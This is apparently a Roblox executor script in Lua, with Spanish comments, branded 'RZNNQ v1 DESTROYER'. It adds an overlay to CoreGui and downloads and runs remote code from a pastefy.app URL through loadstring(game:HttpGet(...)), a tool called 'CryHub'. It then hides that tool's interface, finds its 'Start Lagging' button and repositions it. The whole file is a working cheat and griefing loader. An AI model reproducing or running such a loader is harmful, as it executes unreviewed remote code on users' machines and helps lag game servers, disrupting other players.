local CoreGui = game:GetService("CoreGui")

-- =============================
-- TU UI (NO SE TOCA)
-- =============================
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "RZNNQ_PERSIST_UI"
ScreenGui.Parent = CoreGui
ScreenGui.IgnoreGuiInset = true
ScreenGui.ResetOnSpawn = false

local TextLabel = Instance.new("TextLabel")
TextLabel.Size = UDim2.new(0, 320, 0, 42)
TextLabel.Position = UDim2.new(0.5, -160, 0, 8)
TextLabel.BackgroundTransparency = 1
TextLabel.Text = "RZNNQ v1 DESTROYER"
TextLabel.TextColor3 = Color3.fromRGB(170, 0, 255)
TextLabel.Font = Enum.Font.Arcade
TextLabel.TextSize = 28
TextLabel.TextStrokeTransparency = 0.5
TextLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.Parent = ScreenGui

-- =============================
-- OCULTAR UI CRYHUB DESDE QUE NACE
-- =============================
local hiddenGuis = {}

CoreGui.ChildAdded:Connect(function(child)
    if child:IsA("ScreenGui") and child.Name ~= "RZNNQ_PERSIST_UI" then
        local n = child.Name:lower()
        if n:find("cry") or n:find("hub") or n:find("lag") then
            child.Enabled = false -- invisible INMEDIATO
            table.insert(hiddenGuis, child)
        end
    end
end)

-- =============================
-- EJECUTAR CRYHUB
-- =============================
task.spawn(function()
    loadstring(game:HttpGet("https://pastefy.app/0xXy3NMx/raw"))()
end)

-- =============================
-- POSICIONAR UI ANTES DE MOSTRAR
-- =============================
task.spawn(function()
    local lagButton, rootFrame, cryGui

    -- esperar a que aparezca el botón (aunque esté oculto)
    while not lagButton do
        for _, gui in ipairs(hiddenGuis) do
            for _, v in ipairs(gui:GetDescendants()) do
                if (v:IsA("TextButton") or v:IsA("ImageButton")) then
                    local t = v:IsA("TextButton") and (v.Text or "") or ""
                    if t:lower():find("start") and t:lower():find("lag") then
                        lagButton = v
                        cryGui = gui
                        break
                    end
                end
            end
        end
        task.wait(0.05)
    end

    -- subir hasta el frame raíz
    rootFrame = lagButton
    while rootFrame and not rootFrame:IsA("Frame") do
        rootFrame = rootFrame.Parent
    end
    while rootFrame and rootFrame.Parent and not rootFrame.Parent:IsA("ScreenGui") do
        rootFrame = rootFrame.Parent
    end

    if not (rootFrame and cryGui) then return end

    -- =============================
    -- POSICIONES DEFINITIVAS
    -- =============================

    -- UI CryHub → ARRIBA DERECHA
    rootFrame.AnchorPoint = Vector2.new(1, 0)
    rootFrame.Position = UDim2.new(1, -10, 0, 10)

    -- botón Start Lagging → ABAJO IZQUIERDA
    lagButton.AnchorPoint = Vector2.new(0, 1)
    lagButton.Position = UDim2.new(0, 10, 1, -10)

    -- AHORA SÍ mostrar la UI
    cryGui.Enabled = true
end)
